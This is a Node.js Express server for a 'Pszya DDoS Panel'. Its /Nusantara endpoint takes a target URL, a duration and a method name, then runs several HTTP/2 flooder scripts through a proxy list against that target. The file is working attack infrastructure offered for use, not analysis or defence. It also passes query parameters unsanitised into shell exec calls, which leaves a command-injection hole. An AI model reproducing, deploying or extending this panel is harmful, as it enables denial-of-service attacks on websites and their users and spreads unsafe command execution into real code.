const express = require('express');
const { exec } = require('child_process');

const app = express();
const port = process.env.PORT || process.env.SERVER_PORT || 3000;

// Endpoint root - tambahkan ini
app.get('/', (req, res) => {
  res.status(200).json({
    name: 'Pszya DDoS Panel',
    version: '1.0',
    status: 'online',
    endpoints: {
      attack: '/Nusantara?target=<url>&time=<seconds>&methods=<method>',
      health: '/health'
    },
    available_methods: ['H2-DOLBY', 'H2-BIPAS']
  });
});

app.get('/Nusantara', (req, res) => {
  const { target, time, methods } = req.query;

  // Validasi parameter
  if (!target || !time || !methods) {
    return res.status(400).json({
      error: 'Missing parameters',
      required: 'target, time, methods'
    });
  }

  console.log(`Received: ${methods} -> ${target} for ${time}s`);

  // Kirim response langsung
  res.status(200).json({
    status: 'success',
    message: 'Attack launched',
    target,
    time,
    methods
  });

  // Eksekusi methods
  try {
    switch(methods) {
      case 'H2-DOLBY':
        exec(`node methods/floodernew.js GET ${target} ${time} 16 4 proxy.txt --query 1 --debug`);
        exec(`node methods/rapid.js POST ${target} ${time} 8 4 proxy.txt --query 1 --randrate --full --legit`);
        exec(`node methods/h2-nust.js ${target} ${time} 17 3 proxy.txt`);
        break;

      case 'H2-BIPAS':
        exec(`node methods/h2-nust.js ${target} ${time} 17 2 proxy.txt`);
        exec(`node methods/light.js ${target} ${time} 9 2 proxy.txt`);
        exec(`node methods/v-hold.js ${target} ${time}`);
        break;

      default:
        console.log(`Unknown method: ${methods}`);
    }
  } catch (error) {
    console.log(`Error: ${error.message}`);
  }
});

// Health check endpoint
app.get('/health', (req, res) => {
  res.status(200).json({ status: 'ok' });
});

app.listen(port, '0.0.0.0', () => {
  console.log(`Panel running on port ${port}`);
  console.log(`Root: http://localhost:${port}/`);
  console.log(`Attack: http://localhost:${port}/Nusantara`);
  console.log(`Health: http://localhost:${port}/health`);
});
